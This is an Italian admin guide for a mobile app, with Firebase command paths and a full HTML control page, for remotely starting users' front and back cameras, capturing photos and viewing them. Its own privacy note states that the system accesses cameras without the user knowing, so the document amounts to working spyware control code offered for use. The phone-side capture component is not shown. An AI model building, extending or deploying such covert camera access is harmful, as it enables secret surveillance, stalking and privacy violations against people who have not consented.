# Guida Admin - Controllo Remoto Fotocamere

Questo documento spiega come controllare le fotocamere degli utenti da un sito web admin usando Firebase.

## Struttura Firebase Database

Il sistema utilizza il seguente percorso in Firebase Realtime Database:

```
admin_camera_control/
  └── {userId}/
      ├── command: "start" | "stop" | "capture"
      └── camera: "front" | "back" | "both"
```

## Comandi Disponibili

### 1. Avviare Fotocamera Frontale
```javascript
// Firebase Realtime Database
const userId = "USER_ID_DA_CONTROLLARE";
const adminRef = firebase.database().ref(`admin_camera_control/${userId}`);

adminRef.set({
  command: "start",
  camera: "front"
});
```

### 2. Avviare Fotocamera Posteriore
```javascript
adminRef.set({
  command: "start",
  camera: "back"
});
```

### 3. Avviare Entrambe le Fotocamere
```javascript
adminRef.set({
  command: "start",
  camera: "both"
});
```

### 4. Catturare Foto da Fotocamera Frontale
```javascript
adminRef.set({
  command: "capture",
  camera: "front"
});
```

### 5. Catturare Foto da Fotocamera Posteriore
```javascript
adminRef.set({
  command: "capture",
  camera: "back"
});
```

### 6. Catturare Foto da Entrambe le Fotocamere
```javascript
adminRef.set({
  command: "capture",
  camera: "both"
});
```

### 7. Fermare Fotocamera
```javascript
adminRef.set({
  command: "stop",
  camera: "front" // o "back" o "both"
});
```

## Accesso alle Immagini

Le immagini catturate vengono salvate in Firebase Storage e i loro URL vengono salvati in Firebase Database:

### Firebase Storage Path:
```
remote_camera/
  └── {userId}/
      ├── front/
      │   └── camera_front_TIMESTAMP_UUID.jpg
      └── back/
          └── camera_back_TIMESTAMP_UUID.jpg
```

### Firebase Database Path (per URL):
```
remote_camera_data/
  └── {userId}/
      ├── front/
      │   └── {timestamp}: "https://firebasestorage.googleapis.com/..."
      └── back/
          └── {timestamp}: "https://firebasestorage.googleapis.com/..."
```

## Esempio Completo - Pagina Web Admin

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Camera Control</title>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js"></script>
</head>
<body>
    <h1>Controllo Remoto Fotocamere</h1>
    
    <div>
        <label>User ID:</label>
        <input type="text" id="userId" placeholder="Inserisci User ID">
    </div>
    
    <div>
        <h2>Controlli Fotocamera</h2>
        <button onclick="startFrontCamera()">Avvia Frontale</button>
        <button onclick="startBackCamera()">Avvia Posteriore</button>
        <button onclick="startBothCameras()">Avvia Entrambe</button>
        <button onclick="stopCameras()">Ferma Tutte</button>
    </div>
    
    <div>
        <h2>Cattura Foto</h2>
        <button onclick="captureFront()">Cattura Frontale</button>
        <button onclick="captureBack()">Cattura Posteriore</button>
        <button onclick="captureBoth()">Cattura Entrambe</button>
    </div>
    
    <div id="images"></div>
    
    <script>
        // Inizializza Firebase (sostituisci con le tue credenziali)
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            databaseURL: "YOUR_DATABASE_URL",
            storageBucket: "YOUR_STORAGE_BUCKET"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();
        
        function getAdminRef() {
            const userId = document.getElementById('userId').value;
            if (!userId) {
                alert('Inserisci un User ID');
                return null;
            }
            return database.ref(`admin_camera_control/${userId}`);
        }
        
        function startFrontCamera() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "start",
                    camera: "front"
                });
                alert('Comando inviato: Avvia fotocamera frontale');
            }
        }
        
        function startBackCamera() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "start",
                    camera: "back"
                });
                alert('Comando inviato: Avvia fotocamera posteriore');
            }
        }
        
        function startBothCameras() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "start",
                    camera: "both"
                });
                alert('Comando inviato: Avvia entrambe le fotocamere');
            }
        }
        
        function stopCameras() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "stop",
                    camera: "both"
                });
                alert('Comando inviato: Ferma tutte le fotocamere');
            }
        }
        
        function captureFront() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "capture",
                    camera: "front"
                });
                alert('Comando inviato: Cattura foto frontale');
                // Aspetta qualche secondo e poi carica le immagini
                setTimeout(loadImages, 3000);
            }
        }
        
        function captureBack() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "capture",
                    camera: "back"
                });
                alert('Comando inviato: Cattura foto posteriore');
                setTimeout(loadImages, 3000);
            }
        }
        
        function captureBoth() {
            const ref = getAdminRef();
            if (ref) {
                ref.set({
                    command: "capture",
                    camera: "both"
                });
                alert('Comando inviato: Cattura foto da entrambe le fotocamere');
                setTimeout(loadImages, 3000);
            }
        }
        
        function loadImages() {
            const userId = document.getElementById('userId').value;
            if (!userId) return;
            
            const imagesDiv = document.getElementById('images');
            imagesDiv.innerHTML = '<h2>Immagini Catturate</h2>';
            
            // Carica immagini frontali
            database.ref(`remote_camera_data/${userId}/front`)
                .orderByKey()
                .limitToLast(10)
                .once('value', (snapshot) => {
                    snapshot.forEach((child) => {
                        const imageUrl = child.val();
                        const img = document.createElement('img');
                        img.src = imageUrl;
                        img.style.width = '300px';
                        img.style.margin = '10px';
                        img.alt = 'Front Camera - ' + child.key;
                        imagesDiv.appendChild(img);
                    });
                });
            
            // Carica immagini posteriori
            database.ref(`remote_camera_data/${userId}/back`)
                .orderByKey()
                .limitToLast(10)
                .once('value', (snapshot) => {
                    snapshot.forEach((child) => {
                        const imageUrl = child.val();
                        const img = document.createElement('img');
                        img.src = imageUrl;
                        img.style.width = '300px';
                        img.style.margin = '10px';
                        img.alt = 'Back Camera - ' + child.key;
                        imagesDiv.appendChild(img);
                    });
                });
        }
        
        // Auto-refresh immagini ogni 5 secondi
        setInterval(loadImages, 5000);
    </script>
</body>
</html>
```

## Note Importanti

1. **Sicurezza**: Assicurati di implementare autenticazione admin appropriata prima di permettere l'accesso a questa funzionalità.

2. **Permessi**: L'app richiede il permesso CAMERA per funzionare. L'utente deve aver concesso questo permesso.

3. **Privacy**: Questo sistema accede alle fotocamere senza che l'utente lo sappia. Assicurati di rispettare le leggi sulla privacy locali.

4. **Performance**: Le immagini vengono caricate su Firebase Storage. Monitora l'utilizzo dello storage.

5. **Rate Limiting**: Considera di implementare un rate limiting per evitare abusi.

## Monitoraggio in Tempo Reale

Per monitorare lo stato delle fotocamere in tempo reale:

```javascript
const userId = "USER_ID";
database.ref(`admin_camera_control/${userId}`)
    .on('value', (snapshot) => {
        const data = snapshot.val();
        if (data) {
            console.log('Ultimo comando:', data.command, 'per camera:', data.camera);
        }
    });
```

